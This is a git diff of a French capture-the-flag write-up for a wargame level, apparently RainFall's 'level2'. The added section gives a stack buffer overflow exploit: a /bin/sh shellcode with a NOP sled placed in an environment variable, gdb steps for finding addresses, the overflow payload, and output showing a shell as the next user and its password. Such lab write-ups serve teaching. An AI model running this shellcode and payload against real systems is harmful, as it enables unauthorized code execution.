@@ -61,22 +61,11 @@ Même réflexes que pour les levels précédents :
     `r < <(python -c 'print(76*"A"+"1234")')`
     > EBP: 0x34333231 ('1234')
 
-- En lançant le programme dans gdb, on peut déterminer quelles fonctions nous intéressent :
-  - on place un breakpoint au début de la fonction p : `br p` puis on lance le programme avec `run`
-  - avec `n` on déroule le programme étape par étape jusqu'à l'appel de gets
-  - on écrit quelque chose sur l'entrée standard : `test1`
-  - on saute jusqu'à l'exécution du puts : `jump *0x804852d`
-    > test1
-
-    Le puts renvoie la chaine passée lors de l'appel du gets, puis le programme s'arrête.
-    **C'est donc le `printf` qui nous intéresse.**
-
--  On peut observer avant l'appel du printf une comparaison entre l'entrée standard
-    > 8048500:	3d 00 00 00 b0       	cmp    $0xb0000000,%eax
-
-
+-  On peut observer avant l'appel du printf une comparaison : le programme vérifie qu'il ne copie pas une adresse de la stack (commençant par *0xb*)
+    >    0x08048500 <+44>:	cmp    eax,0xb0000000
+<!-- 
 - Dans gdb :
-   - `gdb-peda$ p system`
+   -- `gdb-peda$ p system`
      > $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
   - `gdb-peda$ searchmem /bin/sh`
     ```
@@ -84,10 +73,62 @@ Même réflexes que pour les levels précédents :
       Found 1 results, display max 1 items:
       libc : 0xb7f8cc58 ("/bin/sh")
     ```
-  - `(python -c "print('A'*76+'\x60\xb0\xe6\xb7'+'....'+'\x58\xcc\xf8\xb7')" ; cat) | ./level2`
+  - `(python -c "print('A'*(76+4)+'\x60\xb0\xe6\xb7'+'....'+'\x58\xcc\xf8\xb7')" ; cat) | ./level2`
     NOPE....
+ -->
+
+-----------------
+
+- La vérification empêche de faire appel à une adresse située sur la stack, mais on peut sauvegarder un shellcode appelant */bin/sh* dans l'env :
+  ```
+  export SHELLCODE=`python -c 'print("\x90"*200+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\xe0\xf6\xff\xbf")'`
+  ```
+- Dans GDB :
+  - Récupérer avec gdb l'adresse du retour de p 
+    `disass p`
+
+    > 0x0804853e <+106>:	ret
+
+  - Récupérer l'adresse de la var SHELLCODE dans l'env
+    `x/s *((char **)environ)`
+      > 0xbffff869
+
+- Dans la VM (hors gdb), on passe dans l'entrée standard du programme 80 caractères (76 + 4 pour overflow le buffer), suivi de l'adresse de ret puis l'adresse du shellcode stocké dans l'env.
+`(python -c 'print("A"*80+"\x3e\x85\x04\x08"+"\x69\xf8\xff\xbf")'; cat ) | ./level2
+
+```
+  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>i���`
+  ls
+  ls: cannot open directory .: Permission denied
+  pwd
+  /home/user/level2
+  whoami
+  level3
+  ls -la /home/user/level3
+  total 17
+  dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
+  dr-x--x--x  1 root   root    340 Sep 23  2015 ..
+  -rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
+  -rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
+  -rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
+  -rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
+  -rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
+  cat /home/user/level3/.pass
+  492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+  ```
+
+
+
 
 <br>
 
+
+
+
+
 ----
 ## Ressources
+- https://dhavalkapil.com/blogs/Shellcode-Injection/
+- https://gist.github.com/lzutao/ca76df0d98cd46e3f7a98f0ac3beed58#background-information
+- https://beta.hackndo.com/buffer-overflow/#pratique
+- https://payatu.com/understanding-stack-based-buffer-overflow
